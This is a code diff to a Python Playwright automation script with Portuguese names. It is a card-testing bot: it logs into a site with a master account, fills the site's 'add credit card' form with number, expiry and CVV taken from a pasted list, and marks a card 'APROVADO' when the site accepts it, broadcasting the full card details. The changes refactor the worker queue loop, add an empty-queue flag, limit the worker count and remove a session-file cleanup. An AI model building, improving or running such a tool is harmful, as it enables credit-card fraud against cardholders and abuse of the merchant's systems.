@@ -26,6 +26,7 @@ estado = {
     "total_cartoes": 0,
     "processados": 0,
     "aprovados": 0,
+    "fila_vazia": False,
 }
 
 def log(mensagem: str):
@@ -92,7 +93,6 @@ async def limpar_cartoes_antigos(page):
     except Exception as e:
         log(f"[Faxina] Erro: {e}")
 
-
 async def login_mestre(playwright):
     try:
         log("[Autenticação] Iniciando login mestre...")
@@ -120,7 +120,6 @@ async def login_mestre(playwright):
         log(f"[ERRO] Login falhou: {e}")
         return False
 
-
 async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict):
     try:
         await asyncio.sleep(id_worker * 2.5)
@@ -129,47 +128,48 @@ async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_f
         page = await context.new_page()
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
 
-        while not fila.empty() and estado["rodando"]:
-            item = await fila.get()
-            indice, linha, tentativas = item
+        while estado["rodando"] and not estado["fila_vazia"]:
             try:
-                numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
-                log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")
+                item = await fila.get()
+                indice, linha, tentativas = item
+                try:
+                    numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
+                    log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")
 
-                await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-                await asyncio.sleep(random.uniform(1.0, 2.5))
+                    await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
+                    await asyncio.sleep(random.uniform(1.0, 2.5))
 
-                await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
+                    await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
 
-                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
-                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
-                await page.get_by_label("Mês").select_option(mes)
-                await page.get_by_label("Ano").select_option(ano)
-                await page.get_by_role("textbox", name="CVV").fill(cvv)
+                    await page.get_by_role("textbox", name="Número do cartão").fill(numero)
+                    await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
+                    await page.get_by_label("Mês").select_option(mes)
+                    await page.get_by_label("Ano").select_option(ano)
+                    await page.get_by_role("textbox", name="CVV").fill(cvv)
 
-                botoes_antes = await page.get_by_role("button", name="Remover").count()
-                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
+                    botoes_antes = await page.get_by_role("button", name="Remover").count()
+                    await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
 
-                for _ in range(30):
-                    if not estado["rodando"]: break
-                    if await page.get_by_role("button", name="Remover").count() > botoes_antes:
-                        log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
-                        await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
-                        estado_fluxo["houve_aprovados"] = True
-                        break
+                    for _ in range(30):
+                        if not estado["rodando"] or estado["fila_vazia"]:
+                            break
+                        if await page.get_by_role("button", name="Remover").count() > botoes_antes:
+                            log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
+                            await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
+                            estado_fluxo["houve_aprovados"] = True
+                            break
 
-                    body = (await page.locator("body").inner_text()).lower()
-                    if any(x in body for x in ["inválida", "recusado", "erro"]):
-                        log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
-                        break
-                    await asyncio.sleep(1.5)
-            except Exception as e:
-                log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
+                        body = (await page.locator("body").inner_text()).lower()
+                        if any(x in body for x in ["inválida", "recusado", "erro"]):
+                            log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
+                            break
+                        await asyncio.sleep(1.5)
+                except Exception as e:
+                    log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
             finally:
                 fila.task_done()
     finally:
         await context.close()
-
 
 async def processar_cartoes(texto_cartoes: str, num_canais: int):
     try:
@@ -179,8 +179,20 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
         estado["total_cartoes"] = len(linhas)
         estado["processados"] = 0
         estado["aprovados"] = 0
+        estado["fila_vazia"] = False
 
         await broadcast("status", {"total": estado["total_cartoes"]})
+
+        if estado["total_cartoes"] == 0:
+            log("[ERRO] Nenhum cartão fornecido para teste.")
+            return
+
+        # Ajustar número de canais conforme a quantidade de cartões
+        num_canais = min(num_canais, estado["total_cartoes"])
+        if num_canais < 1:
+            num_canais = 1
+
+        log(f"[Sistema] Executando com {num_canais} canais de {estado['total_cartoes']} cartões")
 
         fila = asyncio.Queue()
         for idx, linha in enumerate(linhas, 1):
@@ -212,11 +224,10 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
     except Exception as e:
         log(f"[ERRO CRÍTICO] {e}")
     finally:
-        if os.path.exists("sessao_unimar.json"):
-            os.remove("sessao_unimar.json")
         estado["rodando"] = False
-        await broadcast("status", {"rodando": False})
-        log("[Sistema] Processamento finalizado.")
+        estado["fila_vazia"] = True
+        log("[Sistema] Processamento concluído")
+
 
 
 # ===================== ROTAS =====================
